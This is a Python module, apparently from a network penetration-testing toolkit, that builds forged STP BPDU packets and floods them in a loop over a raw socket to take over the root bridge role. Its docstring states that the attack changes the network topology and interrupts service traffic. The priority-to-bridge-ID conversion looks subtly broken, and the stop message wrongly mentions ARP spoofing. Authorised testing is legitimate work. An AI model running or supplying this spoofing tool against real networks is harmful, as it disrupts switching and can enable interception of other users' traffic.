#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>
"""The module for BPDUPacket class"""


import socket
from struct import pack
from time import sleep
from binascii import unhexlify
import logging
from textwrap import dedent

from .helpers import make_valid_mac_address


_LOGGER = logging.getLogger(__name__)


class BPDUPacket:
    """A class that represents BPDU packet for BPDU spoofing attack"""

    def __init__(self, interface, srcmac, dstmac, priority=8192):
        """
        Create an initial information for BPDU Packet

        :interface: your network interface that is connected
                    to the tested network (i.e wlan0)
        :srcmac: your MAC-address (b"\xbb\xbb\xbb\xbb\xbb\xbb"
                                     == bb:bb:bb:bb:bb:bb)
        :dstmac: switch MAC-address
        """
        self.interface = interface
        self.srcmac = make_valid_mac_address(srcmac)
        self.srcmac_str = srcmac
        self.dstmac = make_valid_mac_address(dstmac)
        self.priority = int(priority)
        if interface and srcmac and dstmac:
            _LOGGER.debug(
                "Creating an BPDU packet with your interface %s,"
                "source MAC %s and bridge MAC %s",
                self.interface,
                srcmac,
                dstmac,
            )
        self.description = dedent(
            """\
        On a Layer 2 network, switches running STP, RSTP, MSTP, or VBST
        exchange BPDUs to calculate a spanning tree and trim the ring network
        into a loop-free tree topology. If forged BPDUs are sent to attack a
        device with edge ports and received by them, the device will
        automatically change the edge ports to non-edge ports and recalculate
        the spanning tree. If the bridge priority in the BPDUs sent by an
        attacker is higher than the priority of the root bridge, the network
        topology will change, thereby interrupting service traffic.
        """
        )

    def _create_payload(self):
        """
        Create STP payload as self.payload field

        :return: None
        """
        protocol_type = b"\x00\x00\x02\x02"
        flags = b"\x7e"
        # Priority is equal to 8192
        root_id = self._create_bridge_id(self.srcmac_str, self.priority)
        path_cost = b"\x00" * 4
        bridge_id = root_id
        port_id = b"\x80\x01"
        msg_age = b"\x00\x00"
        max_age = b"\x14\x00"
        hello = b"\x02\x00"
        forward_delay = b"\x0f\x00"
        vers_len = b"\x00"

        self.payload = (
            protocol_type
            + flags
            + root_id
            + path_cost
            + bridge_id
            + port_id
            + msg_age
            + max_age
            + hello
            + forward_delay
            + vers_len
        )

    def _create_bridge_id(self, mac, priority):
        """
        Create a STP Bridge ID

        :mac: MAC address in aa:aa:aa:aa:aa:aa (or uppercase, or with '-')
              format
        :priority: STP priority
        :return: bridgeID in HEX format
        """
        if not (0 <= priority <= 61440):
            raise ValueError("Priority must be in range from 0 to 61440")
        if priority % 4096 != 0:
            raise ValueError("Priority must be divisible by 4096")

        converted_priority = str(int(priority / 4096 * 1000))  # 4096 -> 1000
        str_bridge_id = converted_priority + mac.replace(":", "").replace(
            "-", ""
        )
        _LOGGER.debug("Set Bridge ID %s", converted_priority + "." + mac)
        return unhexlify(str_bridge_id)

    def create_packet(self):
        """
        Create an actual BPDU packet as self.packet field

        :return: None
        """
        self._create_payload()
        llc_header = b"\x42\x42\x03"
        self.header = (
            self.dstmac
            + self.srcmac
            + pack(">H", len(llc_header) + len(self.payload))
            + llc_header
        )
        self.packet = self.header + self.payload

    def send_bpdu_packets(self):
        """Send BPDU packets"""
        _LOGGER.info("Running the BPDU spoofing attack. Press Ctrl+C to stop")
        self.create_packet()
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((self.interface, 0))
        while True:
            try:
                sock.send(self.packet)
                sleep(2)
            except KeyboardInterrupt:
                _LOGGER.warning("Stopping ARP spoofing attack")
                break